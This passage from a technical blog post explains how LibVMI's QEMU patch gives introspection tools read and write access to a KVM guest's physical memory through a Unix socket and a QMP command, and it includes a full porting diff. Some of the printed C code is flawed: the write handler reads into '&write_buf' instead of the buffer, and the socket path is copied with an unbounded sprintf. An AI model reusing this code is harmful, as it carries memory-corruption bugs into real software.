class="params">(<span class="keyword">int</span> connection_fd)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> nbytes;</div><div class="line">  <span class="keyword">struct</span> request req;</div><div class="line"></div><div class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</div><div class="line">    <span class="comment">// client request should match the struct request format</span></div><div class="line">    nbytes = read(connection_fd, &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</div><div class="line">    <span class="keyword">if</span> (nbytes != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request))&#123;</div><div class="line">      <span class="comment">// error</span></div><div class="line">      <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">0</span>)&#123;</div><div class="line">      <span class="comment">// request to quit, goodbye</span></div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">1</span>)&#123;</div><div class="line">      <span class="comment">// request to read</span></div><div class="line">      <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(req.length + <span class="number">1</span>);</div><div class="line">      nbytes = connection_read_memory(req.address, buf, req.length);</div><div class="line">      <span class="keyword">if</span> (nbytes != req.length)&#123;</div><div class="line">        <span class="comment">// read failure, return failure message</span></div><div class="line">        buf[req.length] = <span class="number">0</span>; <span class="comment">// set last byte to 0 for failure</span></div><div class="line">        nbytes = write(connection_fd, buf, <span class="number">1</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">// read success, return bytes</span></div><div class="line">        buf[req.length] = <span class="number">1</span>; <span class="comment">// set last byte to 1 for success</span></div><div class="line">        nbytes = write(connection_fd, buf, nbytes + <span class="number">1</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">free</span>(buf);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">2</span>)&#123;</div><div class="line">      <span class="comment">// request to write</span></div><div class="line">      <span class="keyword">void</span> *write_buf = <span class="built_in">malloc</span>(req.length);</div><div class="line">      nbytes = read(connection_fd, &amp;write_buf, req.length);</div><div class="line">      <span class="keyword">if</span> (nbytes != req.length)&#123;</div><div class="line">        <span class="comment">// failed reading the message to write</span></div><div class="line">        send_fail_ack(connection_fd);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">// do the write</span></div><div class="line">        nbytes = connection_write_memory(req.address, write_buf, req.length);</div><div class="line">        <span class="keyword">if</span> (nbytes == req.length)&#123;</div><div class="line">          send_success_ack(connection_fd);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">          send_fail_ack(connection_fd);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">free</span>(write_buf);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">      <span class="comment">// unknown command</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: ignoring unknown command (%d)\n"</span>, req.type);</div><div class="line">      <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">1</span>);</div><div class="line">      buf[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">      nbytes = write(connection_fd, buf, <span class="number">1</span>);</div><div class="line">      <span class="built_in">free</span>(buf);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  close(connection_fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will parse the request from the connection_fd, the types of request are divided to 3:</p>
<blockquote>
<ul>
<li>0: quit</li>
<li>1: read</li>
<li>2: write</li>
</ul>
</blockquote>
<p>Once it receive read request, it will invoke the <code>connection_read_memory()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> uint64_t</span></div><div class="line"><span class="title">connection_read_memory</span> <span class="params">(<span class="keyword">uint64_t</span> user_paddr, <span class="keyword">void</span> *buf, <span class="keyword">uint64_t</span> user_len)</span></div><div class="line">&#123;</div><div class="line">    hwaddr paddr = (hwaddr) user_paddr;</div><div class="line">    hwaddr len = (hwaddr) user_len;</div><div class="line">    <span class="keyword">void</span> *guestmem = cpu_physical_memory_map(paddr, &amp;len, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (!guestmem)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memcpy</span>(buf, guestmem, len);</div><div class="line">    cpu_physical_memory_unmap(guestmem, len, <span class="number">0</span>, len);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Once it receive write request, it will invoke the <code>connection_write_memory()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> uint64_t</span></div><div class="line"><span class="title">connection_write_memory</span> <span class="params">(<span class="keyword">uint64_t</span> user_paddr, <span class="keyword">void</span> *buf, <span class="keyword">uint64_t</span> user_len)</span></div><div class="line">&#123;</div><div class="line">    hwaddr paddr = (hwaddr) user_paddr;</div><div class="line">    hwaddr len = (hwaddr) user_len;</div><div class="line">    <span class="keyword">void</span> *guestmem = cpu_physical_memory_map(paddr, &amp;len, <span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span> (!guestmem)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memcpy</span>(guestmem, buf, len);</div><div class="line">    cpu_physical_memory_unmap(guestmem, len, <span class="number">0</span>, len);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Then, what we need to do is to invoke the very beginning function <code>do_physical_memory_access()</code>. So here comes the QMP:</p>
<h4 id="Patch-QMP-to-provide-a-entry-to-invoke-do-physical-memory-access-method"><a href="#Patch-QMP-to-provide-a-entry-to-invoke-do-physical-memory-access-method" class="headerlink" title="Patch QMP to provide a entry to invoke do_physical_memory_access() method"></a>Patch QMP to provide a entry to invoke do_physical_memory_access() method</h4><p>How QMP works will be introduced in a new blog in the future. Here I just need to tell what need to add:</p>
<p>in <code>qemu/qmp-command.hx</code> file, we add following code:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  .name       = "pmemaccess",</div><div class="line">  .args_type  = "path:s",</div><div class="line">  .params     = "path",</div><div class="line">  .help       = "mount guest physical memory image at 'path'",</div><div class="line">  .user_print = monitor_user_noop,</div><div class="line">  .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">&#125;,</div><div class="line"></div><div class="line">SQMP</div><div class="line">pmemaccess</div><div class="line">----------</div><div class="line"></div><div class="line">Mount guest physical memory image at 'path'.</div><div class="line"></div><div class="line">Arguments:</div><div class="line"></div><div class="line">- "path": mount point path (json-string)</div><div class="line"></div><div class="line">Example:</div><div class="line"></div><div class="line">-&gt; &#123; "execute": "pmemaccess",</div><div class="line">             "arguments": &#123; "path": "/tmp/guestname" &#125; &#125;</div><div class="line">&lt;- &#123; "return": &#123;&#125; &#125;</div><div class="line"></div><div class="line">EQMP</div></pre></td></tr></table></figure></p>
<p>Note that the code we need here is:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  .name       = <span class="string">"pmemaccess"</span>,</div><div class="line">  .args_type  = <span class="string">"path:s"</span>,</div><div class="line">  .params     = <span class="string">"path"</span>,</div><div class="line">  .help       = <span class="string">"mount guest physical memory image at 'path'"</span>,</div><div class="line">  .user_print = monitor_user_noop,</div><div class="line">  .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">&#125;,</div></pre></td></tr></table></figure></p>
<p>the other code between <code>SQMP</code> and <code>EQMP</code> are just added to the documentation. But it is required!</p>
<p>After adding this command to Qemu QMP, we can invoke <code>do_physical_memory_access()</code> outside of Qemu using such format shown in Example section:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-&gt; &#123; <span class="string">"execute"</span>: <span class="string">"pmemaccess"</span>,</div><div class="line">             <span class="string">"arguments"</span>: &#123; <span class="string">"path"</span>: <span class="string">"/tmp/guestname"</span> &#125; &#125;</div><div class="line">&lt;- &#123; <span class="string">"return"</span>: &#123;&#125; &#125;</div></pre></td></tr></table></figure></p>
<p>For example, in Libvmi, you can find how it invokes this in <code>libvmi/driver/kvm.c</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// QMP Command Interactions</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *</span></div><div class="line"><span class="title">exec_qmp_cmd</span><span class="params">(</span></div><div class="line">    <span class="keyword">kvm_instance_t</span> *kvm,</div><div class="line">    <span class="keyword">char</span> *query)</div><div class="line">&#123;</div><div class="line">  ......</div><div class="line"></div><div class="line">  <span class="built_in">snprintf</span>(cmd, cmd_length, <span class="string">"virsh qemu-monitor-command %s %s"</span>, name,</div><div class="line">   query);</div><div class="line"></div><div class="line">  ......</div><div class="line"></div><div class="line">  p = popen(cmd, <span class="string">"r"</span>);</div><div class="line"></div><div class="line">  ......</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *</span></div><div class="line"><span class="title">exec_memory_access</span><span class="params">(</span></div><div class="line">  <span class="keyword">kvm_instance_t</span> *kvm)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *tmpfile = tempnam(<span class="string">"/tmp"</span>, <span class="string">"vmi"</span>);</div><div class="line">  <span class="keyword">char</span> *query = (<span class="keyword">char</span> *) safe_malloc(<span class="number">256</span>);</div><div class="line"></div><div class="line">  <span class="built_in">sprintf</span>(query,</div><div class="line">  <span class="string">"'&#123;\"execute\": \"pmemaccess\", \"arguments\": &#123;\"path\": \"%s\"&#125;&#125;'"</span>,</div><div class="line">  tmpfile);</div><div class="line"></div><div class="line">  ......</div><div class="line"></div><div class="line">  <span class="keyword">char</span> *output = exec_qmp_cmd(kvm, query);</div><div class="line"></div><div class="line">  ......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>And when it needs to read a page, it needs to map from GPA to HVA, then the libvmi will follow the control from:</p>
<p>vmi_read_va -&gt; (get GPA from vmi_translate_uv2p) -&gt; kvm_read_page -&gt; memory_cache_insert -&gt; create_new_entry -&gt; get_memory_data -&gt; get_memory_callback -&gt; kvm_get_memory_patch</p>
<p>For the last function, it can be found in file <code>libvmi/driver/kvm.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *</span></div><div class="line"><span class="title">kvm_get_memory_patch</span><span class="params">(</span></div><div class="line">    <span class="keyword">vmi_instance_t</span> vmi,</div><div class="line">    <span class="keyword">addr_t</span> paddr,</div><div class="line">    <span class="keyword">uint32_t</span> length)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *buf = safe_malloc(length + <span class="number">1</span>);</div><div class="line">  <span class="keyword">struct</span> request req;</div><div class="line"></div><div class="line">  req.type = <span class="number">1</span>;   <span class="comment">// read request</span></div><div class="line">  req.address = (<span class="keyword">uint64_t</span>) paddr;</div><div class="line">  req.length = (<span class="keyword">uint64_t</span>) length;</div><div class="line"></div><div class="line">  <span class="keyword">int</span> nbytes =</div><div class="line">  write(kvm_get_instance(vmi)-&gt;socket_fd, &amp;req,</div><div class="line">    <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</div><div class="line">  <span class="keyword">if</span> (nbytes != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request)) &#123;</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// get the data from kvm</span></div><div class="line">    nbytes =</div><div class="line">    read(kvm_get_instance(vmi)-&gt;socket_fd, buf, length + <span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span> (nbytes != (length + <span class="number">1</span>)) &#123;</div><div class="line">      <span class="keyword">goto</span> error_exit;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// check that kvm thinks everything is ok by looking at the last byte</span></div><div class="line">    <span class="comment">// of the buffer, 0 is failure and 1 is success</span></div><div class="line">    <span class="keyword">if</span> (buf[length]) &#123;</div><div class="line">      <span class="comment">// success, return pointer to buf</span></div><div class="line">      <span class="keyword">return</span> buf;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// default failure</span></div><div class="line">  error_exit:</div><div class="line">  <span class="keyword">if</span> (buf)</div><div class="line">  <span class="built_in">free</span>(buf);</div><div class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>So it uses the socket_fd to communicate with the connection openned in Qemu to invoke the <code>cpu_physical_read_memory()</code>. So the same with write.</p>
<p>Above are the principle how Qemu-patch work in Libvmi for KVM support, you can find the whole patch <a href="https://github.com/libvmi/libvmi/tree/master/tools/qemu-kvm-patch" target="_blank" rel="external">here</a>, now it only support 0.14 and 1.2 versions. If you know how it works, you can modify the patch and apply your own Qemu version. For example, following is my patch for the Qemu in stable-1.6 branch, e82ee0845c3240541e79b9b521779b3f8743f1b4 commit:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div></pre></td><td class="code"><pre><div class="line"> diff --git a/Makefile.target b/Makefile.target</div><div class="line">index 9a49852..be93dd0 100644</div><div class="line">--- a/Makefile.target</div><div class="line">+++ b/Makefile.target</div><div class="line">@@ -113,7 +113,7 @@ endif #CONFIG_BSD_USER</div><div class="line"> #########################################################</div><div class="line"> # System emulator target</div><div class="line"> ifdef CONFIG_SOFTMMU</div><div class="line">-obj-y += arch_init.o cpus.o monitor.o gdbstub.o balloon.o ioport.o</div><div class="line">+obj-y += arch_init.o cpus.o monitor.o gdbstub.o balloon.o ioport.o memory-access.o</div><div class="line"> obj-y += qtest.o</div><div class="line"> obj-y += hw/</div><div class="line"> obj-$(CONFIG_FDT) += device_tree.o</div><div class="line">diff --git a/memory-access.c b/memory-access.c</div><div class="line">new file mode 100644</div><div class="line">index 0000000..2c81c48</div><div class="line">--- /dev/null</div><div class="line">+++ b/memory-access.c</div><div class="line">@@ -0,0 +1,205 @@</div><div class="line">+/*</div><div class="line">+ * Access guest physical memory via a domain socket.</div><div class="line">+ *</div><div class="line">+ * Copyright (C) 2011 Sandia National Laboratories</div><div class="line">+ * Author: Bryan D. Payne (bdpayne@acm.org)</div><div class="line">+ */</div><div class="line">+</div><div class="line">+#include "memory-access.h"</div><div class="line">+//#include "cpu-all.h"</div><div class="line">+#include "qemu-common.h"</div><div class="line">+#include "exec/cpu-common.h"</div><div class="line">+#include "config.h"</div><div class="line">+</div><div class="line">+#include &lt;stdlib.h&gt;</div><div class="line">+#include &lt;stdio.h&gt;</div><div class="line">+#include &lt;string.h&gt;</div><div class="line">+#include &lt;pthread.h&gt;</div><div class="line">+#include &lt;sys/types.h&gt;</div><div class="line">+#include &lt;sys/socket.h&gt;</div><div class="line">+#include &lt;sys/un.h&gt;</div><div class="line">+#include &lt;unistd.h&gt;</div><div class="line">+#include &lt;signal.h&gt;</div><div class="line">+#include &lt;stdint.h&gt;</div><div class="line">+</div><div class="line">+struct request&#123;</div><div class="line">+  uint8_t type;      // 0 quit, 1 read, 2 write, ... rest reserved</div><div class="line">+  uint64_t address;  // address to read from OR write to</div><div class="line">+  uint64_t length;   // number of bytes to read OR write</div><div class="line">+&#125;;</div><div class="line">+</div><div class="line">+typedef uint64_t target_phys_addr_t;</div><div class="line">+</div><div class="line">+  static uint64_t</div><div class="line">+connection_read_memory (uint64_t user_paddr, void *buf, uint64_t user_len)</div><div class="line">+&#123;</div><div class="line">+  target_phys_addr_t paddr = (target_phys_addr_t) user_paddr;</div><div class="line">+  target_phys_addr_t len = (target_phys_addr_t) user_len;</div><div class="line">+  void *guestmem = cpu_physical_memory_map(paddr, &amp;len, 0);</div><div class="line">+  if (!guestmem)&#123;</div><div class="line">+    return 0;</div><div class="line">+  &#125;</div><div class="line">+  memcpy(buf, guestmem, len);</div><div class="line">+  cpu_physical_memory_unmap(guestmem, len, 0, len);</div><div class="line">+</div><div class="line">+  return len;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static uint64_t</div><div class="line">+connection_write_memory (uint64_t user_paddr, void *buf, uint64_t user_len)</div><div class="line">+&#123;</div><div class="line">+  target_phys_addr_t paddr = (target_phys_addr_t) user_paddr;</div><div class="line">+  target_phys_addr_t len = (target_phys_addr_t) user_len;</div><div class="line">+  void *guestmem = cpu_physical_memory_map(paddr, &amp;len, 1);</div><div class="line">+  if (!guestmem)&#123;</div><div class="line">+    return 0;</div><div class="line">+  &#125;</div><div class="line">+  memcpy(guestmem, buf, len);</div><div class="line">+  cpu_physical_memory_unmap(guestmem, len, 0, len);</div><div class="line">+</div><div class="line">+  return len;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+send_success_ack (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  uint8_t success = 1;</div><div class="line">+  int nbytes = write(connection_fd, &amp;success, 1);</div><div class="line">+  if (1 != nbytes)&#123;</div><div class="line">+    printf("QemuMemoryAccess: failed to send success ack\n");</div><div class="line">+  &#125;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+send_fail_ack (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  uint8_t fail = 0;</div><div class="line">+  int nbytes = write(connection_fd, &amp;fail, 1);</div><div class="line">+  if (1 != nbytes)&#123;</div><div class="line">+    printf("QemuMemoryAccess: failed to send fail ack\n");</div><div class="line">+  &#125;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+connection_handler (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  int nbytes;</div><div class="line">+  struct request req;</div><div class="line">+</div><div class="line">+  while (1)&#123;</div><div class="line">+    // client request should match the struct request format</div><div class="line">+    nbytes = read(connection_fd, &amp;req, sizeof(struct request));</div><div class="line">+    printf("req is %d\n", req.type);</div><div class="line">+    if (nbytes != sizeof(struct request))&#123;</div><div class="line">+      // error</div><div class="line">+      continue;</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 0)&#123;</div><div class="line">+      // request to quit, goodbye</div><div class="line">+      break;</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 1)&#123;</div><div class="line">+      // request to read</div><div class="line">+      char *buf = malloc(req.length + 1);</div><div class="line">+      nbytes = connection_read_memory(req.address, buf, req.length);</div><div class="line">+      if (nbytes != req.length)&#123;</div><div class="line">+        // read failure, return failure message</div><div class="line">+        buf[req.length] = 0; // set last byte to 0 for failure</div><div class="line">+        nbytes = write(connection_fd, buf, 1);</div><div class="line">+      &#125;</div><div class="line">+      else&#123;</div><div class="line">+        // read success, return bytes</div><div class="line">+        buf[req.length] = 1; // set last byte to 1 for success</div><div class="line">+        nbytes = write(connection_fd, buf, nbytes + 1);</div><div class="line">+      &#125;</div><div class="line">+      free(buf);</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 2)&#123;</div><div class="line">+      // request to write</div><div class="line">+      void *write_buf = malloc(req.length);</div><div class="line">+      nbytes = read(connection_fd, &amp;write_buf, req.length);</div><div class="line">+      if (nbytes != req.length)&#123;</div><div class="line">+        // failed reading the message to write</div><div class="line">+        send_fail_ack(connection_fd);</div><div class="line">+      &#125;</div><div class="line">+      else&#123;</div><div class="line">+        // do the write</div><div class="line">+        nbytes = connection_write_memory(req.address, write_buf, req.length);</div><div class="line">+        if (nbytes == req.length)&#123;</div><div class="line">+          send_success_ack(connection_fd);</div><div class="line">+        &#125;</div><div class="line">+        else&#123;</div><div class="line">+          send_fail_ack(connection_fd);</div><div class="line">+        &#125;</div><div class="line">+      &#125;</div><div class="line">+      free(write_buf);</div><div class="line">+    &#125;</div><div class="line">+    else&#123;</div><div class="line">+      // unknown command</div><div class="line">+      printf("QemuMemoryAccess: ignoring unknown command (%d)\n", req.type);</div><div class="line">+      char *buf = malloc(1);</div><div class="line">+      buf[0] = 0;</div><div class="line">+      nbytes = write(connection_fd, buf, 1);</div><div class="line">+      free(buf);</div><div class="line">+    &#125;</div><div class="line">+  &#125;</div><div class="line">+</div><div class="line">+  close(connection_fd);</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void *</div><div class="line">+memory_access_thread (void *path)</div><div class="line">+&#123;</div><div class="line">+  struct sockaddr_un address;</div><div class="line">+  int socket_fd, connection_fd;</div><div class="line">+  socklen_t address_length;</div><div class="line">+</div><div class="line">+  printf("in memory_access_thread : %s\n", (char *)path);</div><div class="line">+</div><div class="line">+  socket_fd = socket(PF_UNIX, SOCK_STREAM, 0);</div><div class="line">+  if (socket_fd &lt; 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: socket failed\n");</div><div class="line">+    goto error_exit;</div><div class="line">+  &#125;</div><div class="line">+  unlink(path);</div><div class="line">+  address.sun_family = AF_UNIX;</div><div class="line">+  address_length = sizeof(address.sun_family) + sprintf(address.sun_path, "%s", (char *) path);</div><div class="line">+</div><div class="line">+  if (bind(socket_fd, (struct sockaddr *) &amp;address, address_length) != 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: bind failed\n");</div><div class="line">+    goto 